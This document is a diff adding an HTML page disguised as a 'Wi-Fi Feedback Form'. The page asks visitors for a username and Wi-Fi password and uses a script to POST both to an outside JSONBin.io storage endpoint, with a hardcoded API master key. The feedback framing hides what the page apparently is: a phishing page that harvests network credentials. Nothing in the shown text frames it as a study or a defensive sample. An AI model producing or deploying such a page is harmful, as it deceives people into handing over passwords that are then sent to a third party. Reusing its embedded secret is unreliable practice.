@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wi-Fi Feedback Form</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-size: 1.8rem;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 5px;
+      color: #333;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #007BFF;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #007BFF;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Wi-Fi Feedback Form</h1>
+    <form id="wifi-feedback-form">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" placeholder="Enter your username" required>
+      </div>
+      <div class="form-group">
+        <label for="wifi-password">Wi-Fi Password</label>
+        <input type="password" id="wifi-password" name="wifi-password" placeholder="Enter the Wi-Fi password" required>
+      </div>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+  <script>
+    document.getElementById('wifi-feedback-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const wifiPassword = document.getElementById('wifi-password').value;
+
+      const data = { username, wifiPassword };
+
+      // Replace with your actual Bin URL
+      const binUrl = "https://api.jsonbin.io/v3/b"; // Replace with your JSONBin.io Bin URL
+      const apiKey = "676ef664ad19ca34f8e1cf20";
+
+      try {
+        const response = await fetch(binUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': apiKey,
+          },
+          body: JSON.stringify(data),
+        });
+
+        if (response.ok) {
+          alert('Feedback submitted successfully!');
+          document.getElementById('wifi-feedback-form').reset();
+        } else {
+          alert('Failed to submit feedback.');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while submitting your feedback.');
+      }
+    });
+  </script>
+</body>
+</html>
